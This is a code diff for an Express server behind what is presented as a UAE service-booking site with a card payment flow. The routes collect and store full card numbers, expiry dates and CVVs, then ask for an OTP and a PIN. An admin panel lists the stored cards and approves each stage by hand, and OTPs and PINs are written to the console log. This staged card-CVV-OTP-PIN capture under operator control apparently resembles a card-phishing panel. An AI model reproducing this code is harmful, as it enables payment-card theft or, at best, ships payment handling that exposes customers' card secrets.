@@ -2,25 +2,10 @@ import express, { Request, Response } from "express";
 import { createServer } from "http";
 import path from "path";
 import { fileURLToPath } from "url";
+import * as db from "./db";
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
-
-// In-memory storage for payments (in production, use a database)
-interface Payment {
-  id: string;
-  email: string;
-  cardNumber: string;
-  cardHolder: string;
-  expiryDate: string;
-  cvv: string;
-  status: 'pending_card' | 'pending_otp' | 'pending_pin' | 'completed' | 'rejected';
-  otp?: string;
-  pin?: string;
-  createdAt: string;
-}
-
-const payments: Map<string, Payment> = new Map();
 
 // Helper to generate OTP
 function generateOTP(): string {
@@ -52,12 +37,50 @@ async function startServer() {
     }
   });
 
+  // ========== BOOKING API ROUTES ==========
+
+  // Create booking
+  app.post("/api/booking/create", async (req: Request, res: Response) => {
+    try {
+      const { customerName, customerEmail, customerPhone, emirate, serviceType, serviceDate, serviceTime, totalAmount, notes } = req.body;
+
+      if (!customerName || !customerEmail || !customerPhone || !emirate || !serviceType || !serviceDate || !serviceTime || !totalAmount) {
+        return res.status(400).json({ error: "Missing required fields" });
+      }
+
+      const bookingId = generateId();
+      const booking = await db.createBooking({
+        id: bookingId,
+        customerName,
+        customerEmail,
+        customerPhone,
+        emirate,
+        serviceType,
+        serviceDate,
+        serviceTime,
+        totalAmount: parseFloat(totalAmount),
+        notes,
+      });
+
+      console.log(`[BOOKING] New booking created: ${bookingId} for ${customerEmail}`);
+
+      res.json({ 
+        success: true, 
+        bookingId,
+        message: "Booking created successfully."
+      });
+    } catch (error) {
+      console.error("Error creating booking:", error);
+      res.status(500).json({ error: "Internal server error" });
+    }
+  });
+
   // ========== PAYMENT API ROUTES ==========
 
   // Submit card details
-  app.post("/api/payment/submit-card", (req: Request, res: Response) => {
+  app.post("/api/payment/submit-card", async (req: Request, res: Response) => {
     try {
-      const { cardNumber, cardHolder, expiryDate, cvv, email } = req.body;
+      const { cardNumber, cardHolder, expiryDate, cvv, email, bookingId } = req.body;
 
       if (!cardNumber || !cardHolder || !expiryDate || !cvv || !email) {
         return res.status(400).json({ error: "Missing required fields" });
@@ -66,21 +89,17 @@ async function startServer() {
       const paymentId = generateId();
       const otp = generateOTP();
 
-      const payment: Payment = {
+      await db.createPayment({
         id: paymentId,
+        bookingId: bookingId || '',
         email,
         cardNumber,
         cardHolder,
         expiryDate,
         cvv,
-        status: 'pending_card',
         otp,
-        createdAt: new Date().toISOString(),
-      };
+      });
 
-      payments.set(paymentId, payment);
-
-      // In production, send OTP via email
       console.log(`[PAYMENT] Card submitted for ${email}. OTP: ${otp}`);
 
       res.json({ 
@@ -95,21 +114,15 @@ async function startServer() {
   });
 
   // Verify OTP
-  app.post("/api/payment/verify-otp", (req: Request, res: Response) => {
+  app.post("/api/payment/verify-otp", async (req: Request, res: Response) => {
     try {
-      const { otp, email } = req.body;
+      const { otp, email, paymentId } = req.body;
 
-      if (!otp || !email) {
-        return res.status(400).json({ error: "Missing OTP or email" });
+      if (!otp || !email || !paymentId) {
+        return res.status(400).json({ error: "Missing OTP, email, or payment ID" });
       }
 
-      // Find payment by email
-      let payment: Payment | undefined;
-      payments.forEach((p) => {
-        if (p.email === email && p.status === 'pending_otp') {
-          payment = p;
-        }
-      });
+      const payment = await db.getPaymentById(paymentId);
 
       if (!payment) {
         return res.status(404).json({ error: "Payment not found" });
@@ -119,10 +132,10 @@ async function startServer() {
         return res.status(400).json({ error: "Invalid OTP" });
       }
 
-      payment.status = 'pending_pin';
-      payment.pin = Math.floor(1000 + Math.random() * 9000).toString();
+      const pin = Math.floor(1000 + Math.random() * 9000).toString();
+      await db.updatePaymentPIN(paymentId, pin);
 
-      console.log(`[PAYMENT] OTP verified for ${email}. PIN: ${payment.pin}`);
+      console.log(`[PAYMENT] OTP verified for ${email}. PIN: ${pin}`);
 
       res.json({ 
         success: true,
@@ -135,21 +148,15 @@ async function startServer() {
   });
 
   // Verify PIN
-  app.post("/api/payment/verify-pin", (req: Request, res: Response) => {
+  app.post("/api/payment/verify-pin", async (req: Request, res: Response) => {
     try {
-      const { pin, email } = req.body;
+      const { pin, email, paymentId } = req.body;
 
-      if (!pin || !email) {
-        return res.status(400).json({ error: "Missing PIN or email" });
+      if (!pin || !email || !paymentId) {
+        return res.status(400).json({ error: "Missing PIN, email, or payment ID" });
       }
 
-      // Find payment by email
-      let payment: Payment | undefined;
-      payments.forEach((p) => {
-        if (p.email === email && p.status === 'pending_pin') {
-          payment = p;
-        }
-      });
+      const payment = await db.getPaymentById(paymentId);
 
       if (!payment) {
         return res.status(404).json({ error: "Payment not found" });
@@ -159,7 +166,7 @@ async function startServer() {
         return res.status(400).json({ error: "Invalid PIN" });
       }
 
-      payment.status = 'completed';
+      await db.completePayment(paymentId);
 
       console.log(`[PAYMENT] PIN verified for ${email}. Payment completed!`);
 
@@ -176,20 +183,10 @@ async function startServer() {
   // ========== ADMIN API ROUTES ==========
 
   // Get all pending payments
-  app.get("/api/admin/payments", (req: Request, res: Response) => {
+  app.get("/api/admin/payments", async (req: Request, res: Response) => {
     try {
-      const allPayments = Array.from(payments.values())
-        .filter(p => p.status !== 'completed' && p.status !== 'rejected')
-        .map(p => ({
-          id: p.id,
-          email: p.email,
-          cardNumber: p.cardNumber,
-          cardHolder: p.cardHolder,
-          status: p.status,
-          createdAt: p.createdAt,
-        }));
-
-      res.json(allPayments);
+      const payments = await db.getPendingPayments();
+      res.json(payments);
     } catch (error) {
       console.error("Error fetching payments:", error);
       res.status(500).json({ error: "Internal server error" });
@@ -197,23 +194,23 @@ async function startServer() {
   });
 
   // Approve payment (move to next step)
-  app.post("/api/admin/payments/:id/approve", (req: Request, res: Response) => {
+  app.post("/api/admin/payments/:id/approve", async (req: Request, res: Response) => {
     try {
       const { id } = req.params;
-      const payment = payments.get(id);
+      const payment = await db.getPaymentById(id);
 
       if (!payment) {
         return res.status(404).json({ error: "Payment not found" });
       }
 
       if (payment.status === 'pending_card') {
-        payment.status = 'pending_otp';
+        await db.updatePaymentStatus(id, 'pending_otp');
         console.log(`[ADMIN] Card approved for ${payment.email}`);
       } else if (payment.status === 'pending_otp') {
-        payment.status = 'pending_pin';
+        await db.updatePaymentStatus(id, 'pending_pin');
         console.log(`[ADMIN] OTP approved for ${payment.email}`);
       } else if (payment.status === 'pending_pin') {
-        payment.status = 'completed';
+        await db.completePayment(id);
         console.log(`[ADMIN] PIN approved for ${payment.email}`);
       }
 
@@ -228,16 +225,16 @@ async function startServer() {
   });
 
   // Reject payment
-  app.post("/api/admin/payments/:id/reject", (req: Request, res: Response) => {
+  app.post("/api/admin/payments/:id/reject", async (req: Request, res: Response) => {
     try {
       const { id } = req.params;
-      const payment = payments.get(id);
+      const payment = await db.getPaymentById(id);
 
       if (!payment) {
         return res.status(404).json({ error: "Payment not found" });
       }
 
-      payment.status = 'rejected';
+      await db.rejectPayment(id);
       console.log(`[ADMIN] Payment rejected for ${payment.email}`);
 
       res.json({ 
@@ -246,6 +243,17 @@ async function startServer() {
       });
     } catch (error) {
       console.error("Error rejecting payment:", error);
+      res.status(500).json({ error: "Internal server error" });
+    }
+  });
+
+  // Get statistics
+  app.get("/api/admin/statistics", async (req: Request, res: Response) => {
+    try {
+      const stats = await db.getStatistics();
+      res.json(stats);
+    } catch (error) {
+      console.error("Error fetching statistics:", error);
       res.status(500).json({ error: "Internal server error" });
     }
   });
